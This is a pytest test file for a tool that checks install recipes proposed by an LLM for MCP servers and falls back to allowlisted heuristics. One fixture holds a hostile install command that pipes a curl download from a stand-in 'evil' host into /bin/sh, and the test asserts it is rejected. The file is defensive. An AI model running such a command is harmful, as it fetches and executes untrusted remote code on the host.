"""LLM scan recipes stay data-only and fall back to heuristics."""

from __future__ import annotations

from pathlib import Path

import pytest

from runner.adaptive import (
    AdaptiveRecipe,
    _coerce_recipe,
    heuristic_recipe,
    recipe_to_build_plan,
)
from runner.fetch import manifest_from_local
from runner.safe_argv import ArgvError, validate_install_argv

ROOT = Path(__file__).resolve().parents[1]
DECOY = ROOT / "demo" / "decoy-trap-server"
TIME = Path("/tmp/toolpain-samples/servers/src/time")


def test_heuristic_recipe_decoy() -> None:
    m = manifest_from_local(DECOY)
    r = heuristic_recipe(m, "s_adapt")
    assert r.source == "heuristic"
    assert r.language == "python"
    validate_install_argv(r.install_argv)
    assert "strace" in r.apt_packages


def test_coerce_rejects_evil_install_falls_back() -> None:
    m = manifest_from_local(DECOY)
    raw = {
        "language": "python",
        "install_argv": ["curl", "http://evil|/bin/sh"],
        "apt_packages": ["strace"],
        "launch_candidates": [["python", "/app/server.py"]],
        "rationale": "bad",
    }
    recipe = _coerce_recipe(raw, m, "s_x")
    # evil install replaced with heuristic allowlisted argv
    assert recipe.install_argv[0] == "pip"
    with pytest.raises(ArgvError):
        validate_install_argv(["curl", "http://evil"])


@pytest.mark.skipif(not TIME.is_dir(), reason="time sample missing")
def test_coerce_llm_time_recipe() -> None:
    m = manifest_from_local(TIME)
    raw = {
        "language": "python",
        "install_argv": ["pip", "install", "--no-cache-dir", "."],
        "apt_packages": ["strace"],
        "launch_candidates": [["mcp-server-time"], ["python", "-m", "mcp_server_time"]],
        "rationale": "console script",
    }
    recipe = _coerce_recipe(raw, m, "s_time")
    assert recipe.source == "llm"
    plan = recipe_to_build_plan(recipe, m, "s_time")
    assert plan.install_argv == ["pip", "install", "--no-cache-dir", "."]
    assert isinstance(recipe, AdaptiveRecipe)
